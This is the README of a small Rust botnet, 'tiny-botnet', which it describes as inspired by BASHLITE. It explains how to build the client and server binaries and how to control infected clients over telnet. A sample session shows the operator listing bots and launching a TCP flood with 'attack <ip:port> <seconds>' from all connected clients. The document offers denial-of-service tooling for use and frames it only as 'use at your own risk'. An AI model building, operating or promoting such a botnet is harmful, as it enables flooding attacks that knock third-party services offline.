# tiny-botnet

Simple botnet example written in rust, loosely inspired by BASHLITE, (try to) use at your own risk!

## features
* Auto reconnection
* Async networking on server via smol and non blocking networking on client using mio
* Control via telnet with password authentication
* Basic TCP flood implementation

## running/compiling

Rename the `.env.sample` file to `.env` and edit the variables to your liking, then either `cargo run --bin client/server` to run the client or the server or `cargo build` to build both binaries with the provided environment variables

## control

Connect to `SERVER_CONTROLLER_LISTENER_ADDR` via telnet and enter the `PASSWORD`

```
$ telnet 192.168.1.46 6667
Trying 192.168.1.46...
Connected to 192.168.1.46.
Escape character is '^]'.
PASS: MYPASSWORD

  _   _                   _           _              _
 | |_(_)_ __  _   _      | |__   ___ | |_ _ __   ___| |_
 | __| | '_ \| | | |_____| '_ \ / _ \| __| '_ \ / _ \ __|
 | |_| | | | | |_| |_____| |_) | (_) | |_| | | |  __/ |_
  \__|_|_| |_|\__, |     |_.__/ \___/ \__|_| |_|\___|\__|
              |___/
1 client(s) online!
-> help
Command list:
ls                           - Lists connected clients
attack <ip:port> <seconds>   - Starts a TCP Flood attack from all clients
-> ls
ip: 1.2.3.4 uuid: AA:BB:CC:DD:EE:FF last_ping: 4 secs ago
-> attack 4.5.6.7:1234 100
...
```